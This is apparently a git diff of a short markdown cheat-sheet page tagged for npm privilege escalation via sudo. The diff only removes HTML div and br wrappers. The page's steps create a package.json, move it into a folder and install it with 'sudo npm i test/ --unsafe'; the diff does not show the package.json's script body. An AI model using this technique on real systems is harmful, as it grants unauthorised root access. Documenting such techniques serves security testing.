@@ -8,8 +8,6 @@ tags: ["npm", "nodejs", "privesc", "sudo"]
 
 Create a 'package.json'
 
-<div>
-
 ```console
 {
   "name": "root",
@@ -20,11 +18,7 @@ Create a 'package.json'
 }
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 mkdir test
@@ -37,7 +31,3 @@ mv package.json test/
 ```console
 sudo npm i test/ --unsafe
 ```
-
-</div>
-
-<br>
